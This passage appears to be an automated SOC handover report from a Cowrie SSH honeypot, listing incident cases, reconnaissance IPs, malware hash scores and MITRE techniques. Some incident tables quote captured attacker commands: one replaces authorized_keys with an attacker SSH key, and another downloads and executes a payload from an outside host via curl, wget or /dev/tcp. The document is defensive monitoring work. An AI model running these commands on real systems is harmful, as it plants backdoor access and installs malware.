- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81d9fefb50d

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-06-01 19:18 |
| **Last Seen** | 2026-06-01 19:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:18:14` | `cowrie.session.connect` |
| `2026-06-01 19:18:14` | `cowrie.client.version` |
| `2026-06-01 19:18:14` | `cowrie.client.kex` |
| `2026-06-01 19:18:15` | `cowrie.login.success` |
| `2026-06-01 19:18:15` | `cowrie.session.params` |
| `2026-06-01 19:18:15` | `cowrie.command.input` |
| `2026-06-01 19:18:15` | `cowrie.command.failed` |
| `2026-06-01 19:18:15` | `cowrie.log.closed` |
| `2026-06-01 19:18:15` | `cowrie.session.params` |
| `2026-06-01 19:18:15` | `cowrie.command.input` |
| `2026-06-01 19:18:16` | `cowrie.session.file_download` |
| `2026-06-01 19:18:16` | `cowrie.log.closed` |
| `2026-06-01 19:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061683fd6a87

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-06-01 19:18 |
| **Last Seen** | 2026-06-01 19:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:18:17` | `cowrie.session.connect` |
| `2026-06-01 19:18:17` | `cowrie.client.version` |
| `2026-06-01 19:18:18` | `cowrie.client.kex` |
| `2026-06-01 19:18:18` | `cowrie.login.success` |
| `2026-06-01 19:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55399f3e3b8d

| Field | Detail |
|---|---|
| **Source IP** | `47.113.218[.]14` |
| **First Seen** | 2026-06-01 19:20 |
| **Last Seen** | 2026-06-01 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://8.218.234[.]50:60130/arm_linux -o /tmp/2zq3hpbgwY; if [ ! -f /tmp/2zq3hpbgwY ]; then wget hxxp://8.218.234[.]50:60130/arm_linux -O /tmp/2zq3hpbgwY; fi; if [ ! -f /tmp/2zq3hpbgwY ]; then exec 6<>/dev/tcp/8.218.234[.]50/60130 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/2zq3hpbgwY ; chmod +x /tmp/2zq3hpbgwY && /tmp/2zq3hpbgwY Q/VMFE/L+kfsUX0ueFPtU/7JTAtF9To5+0YPSdf5W+tIcDlzUO1Y+MldDkP7OTj7QwJTyP5Z51B5MXlT/Vj5wFMLTewgPeBaCE3K8l/tV3swaV7zW/nBUwhH4SA75U4MTcj7Wf1XeDFnVO5H+sxPFEblPzTjR, head -c 2612960 > /tmp/QI8TwcpZ36, nohup $SHELL -c "curl hxxp://8.218.234[.]50:60130/arm_linux -o /tmp/2zq3hpbgwY; if [ ! -f /tmp/2zq3hpbgwY ]; then wget hxxp://8.218.234[.]50:60130/arm_linux -O /tmp/2zq3hpbgwY; fi; if [ ! -f /tmp/2zq3hpbgwY ]; then exec 6<>/dev/tcp/8.218.234[.]50/60130 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/2zq3hpbgwY ; chmod +x /tmp/2zq3hpbgwY && /tmp/2zq3hpbgwY Q/VMFE/L+kfsUX0ueFPtU/7JTAtF9To5+0YPSdf5W+tIcDlzUO1Y+MldDkP7OTj7QwJTyP5Z51B5MXlT/Vj5wFMLTewgPeBaCE3K8l/tV3swaV7zW/nBUwhH4SA75U4MTcj7Wf1XeDFnVO5H+sxPFEblPzTjR, (vLXXXELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 19:20:52` | `cowrie.session.connect` |
| `2026-06-01 19:20:52` | `cowrie.client.version` |
| `2026-06-01 19:20:52` | `cowrie.client.kex` |
| `2026-06-01 19:20:52` | `cowrie.login.success` |
| `2026-06-01 19:20:53` | `cowrie.session.params` |
| `2026-06-01 19:20:53` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.input` |
| `2026-06-01 19:20:56` | `cowrie.command.failed` |
| `2026-06-01 19:20:56` | `cowrie.command.failed` |
| `2026-06-01 19:20:56` | `cowrie.log.closed` |
| `2026-06-01 19:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.113.218[.]14` to AbuseIPDB if not already reported
- [ ] Block `47.113.218[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d9cace2d22

| Field | Detail |
|---|---|
| **Source IP** | `194.113.195[.]96` |
| **First Seen** | 2026-06-01 20:21 |
| **Last Seen** | 2026-06-01 20:23 |
| **Session Duration** | 99s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 20:21:45` | `cowrie.session.connect` |
| `2026-06-01 20:21:45` | `cowrie.client.version` |
| `2026-06-01 20:21:45` | `cowrie.client.kex` |
| `2026-06-01 20:21:46` | `cowrie.login.success` |
| `2026-06-01 20:23:24` | `cowrie.session.file_upload` |
| `2026-06-01 20:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.113.195[.]96` to AbuseIPDB if not already reported
- [ ] Block `194.113.195[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d50eed4eb26b

| Field | Detail |
|---|---|
| **Source IP** | `89.228.74[.]4` |
| **First Seen** | 2026-06-01 21:29 |
| **Last Seen** | 2026-06-01 21:31 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox JOUBI` |
| **Download Attempts** | tfxxp://89.228.74[.]4:8575/.i |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 21:29:57` | `cowrie.session.connect` |
| `2026-06-01 21:29:58` | `cowrie.telnet.option` |
| `2026-06-01 21:29:58` | `cowrie.login.success` |
| `2026-06-01 21:29:58` | `cowrie.session.params` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:58` | `cowrie.command.failed` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:58` | `cowrie.command.failed` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:58` | `cowrie.command.input` |
| `2026-06-01 21:29:59` | `cowrie.command.input` |
| `2026-06-01 21:29:59` | `cowrie.command.input` |
| `2026-06-01 21:29:59` | `cowrie.command.failed` |
| `2026-06-01 21:29:59` | `cowrie.command.input` |
| `2026-06-01 21:29:59` | `cowrie.command.input` |
| `2026-06-01 21:30:24` | `cowrie.session.file_download` |
| `2026-06-01 21:31:39` | `cowrie.log.closed` |
| `2026-06-01 21:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.228.74[.]4` to AbuseIPDB if not already reported
- [ ] Block `89.228.74[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.130[.]213` | **32** | 2026-06-01 18:37 | 2026-06-01 19:10 | 45m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.76.120[.]225` | **30** | 2026-06-01 18:40 | 2026-06-01 19:00 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.125[.]9` | **15** | 2026-06-01 21:05 | 2026-06-01 21:08 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **13** | 2026-06-01 17:49 | 2026-06-01 20:24 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `166.62.42[.]127` | **8** | 2026-06-01 17:50 | 2026-06-01 19:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `3.144.236[.]65` | **3** | 2026-06-01 18:32 | 2026-06-01 18:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.227.101[.]30` | **3** | 2026-06-01 19:56 | 2026-06-01 20:55 | 2m | 0 | `T1592` | 🟢 LOW |
| `8.216.5[.]7` | **3** | 2026-06-01 17:59 | 2026-06-01 17:59 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `20.29.23[.]176` | **2** | 2026-06-01 21:06 | 2026-06-01 21:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.29.49[.]134` | **2** | 2026-06-01 20:07 | 2026-06-01 20:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.237.123[.]204` | **2** | 2026-06-01 19:44 | 2026-06-01 19:50 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.227.203[.]162` | 1 | 2026-06-01 18:16 | 2026-06-01 18:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]169` | 1 | 2026-06-01 20:59 | 2026-06-01 21:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-06-01 18:17 | 2026-06-01 18:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-06-01 18:12 | 2026-06-01 18:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-06-01 18:33 | 2026-06-01 18:33 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.90[.]30` | 1 | 2026-06-01 18:39 | 2026-06-01 18:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `156.245.246[.]50` | 1 | 2026-06-01 19:18 | 2026-06-01 19:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.191.194[.]175` | 1 | 2026-06-01 18:30 | 2026-06-01 18:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]161` | 1 | 2026-06-01 18:08 | 2026-06-01 18:08 | 0s | 2 | `T1110.001` | 🟢 LOW |
| `195.184.76[.]200` | 1 | 2026-06-01 18:08 | 2026-06-01 18:08 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.181.171[.]136` | 1 | 2026-06-01 20:50 | 2026-06-01 20:50 | 8s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]10` | 1 | 2026-06-01 19:22 | 2026-06-01 19:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `89.37.172[.]150` | 1 | 2026-06-01 21:05 | 2026-06-01 21:05 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.144.236[.]65` | US | Amazon Technologies Inc. | **100** ⚠️ | 36 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `166.62.42[.]127` | US | GoDaddy.com, LLC | **100** ⚠️ | 9 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `87.236.176[.]10` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `195.184.76[.]161` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `47.237.123[.]204` | SG | Alibaba Cloud LLC | **100** ⚠️ | 2 |
| `8.216.5[.]7` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 29 |
| `223.123.125[.]9` | PK | CMPak Limited | **100** ⚠️ | 0 |
| `89.37.172[.]150` | GB | Infrawatch Limited | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 40 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (39 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 33 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 194 cases |
| Tool 34  | Credential Extractor        | ✅ 72 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 39 filtered (20.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 113 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-01T21:37:46Z_
